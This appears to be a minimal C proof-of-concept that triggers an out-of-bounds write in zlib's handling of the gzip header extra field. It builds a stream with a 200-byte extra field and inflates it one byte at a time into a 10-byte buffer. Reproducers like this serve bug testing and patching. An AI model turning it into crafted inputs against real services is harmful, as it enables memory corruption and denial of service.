#include <zlib.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
int main(void){
  unsigned char big_extra[200]; memset(big_extra,0x41,200);
  gz_header dh; memset(&dh,0,sizeof(dh)); dh.extra=big_extra; dh.extra_len=200;
  unsigned char msg[]="hello world hello world";
  unsigned char comp[1024]; z_stream d; memset(&d,0,sizeof(d));
  deflateInit2(&d,6,Z_DEFLATED,16+MAX_WBITS,8,Z_DEFAULT_STRATEGY);
  deflateSetHeader(&d,&dh);
  d.next_in=msg; d.avail_in=sizeof(msg); d.next_out=comp; d.avail_out=sizeof(comp);
  deflate(&d,Z_FINISH); size_t clen=d.total_out; deflateEnd(&d);
  // inflate: extra_max=10, 압축스트림을 1바이트씩 -> extra 필드 청크처리 중 OOB
  unsigned char smallbuf[10]; gz_header ih; memset(&ih,0,sizeof(ih));
  ih.extra=smallbuf; ih.extra_max=10;
  unsigned char out[1024]; z_stream i; memset(&i,0,sizeof(i));
  inflateInit2(&i,16+MAX_WBITS); inflateGetHeader(&i,&ih);
  i.next_out=out; i.avail_out=sizeof(out);
  for(size_t k=0;k<clen;k++){ i.next_in=comp+k; i.avail_in=1; if(inflate(&i,Z_NO_FLUSH)<0)break; }
  inflateEnd(&i); printf("done\n"); return 0;
}
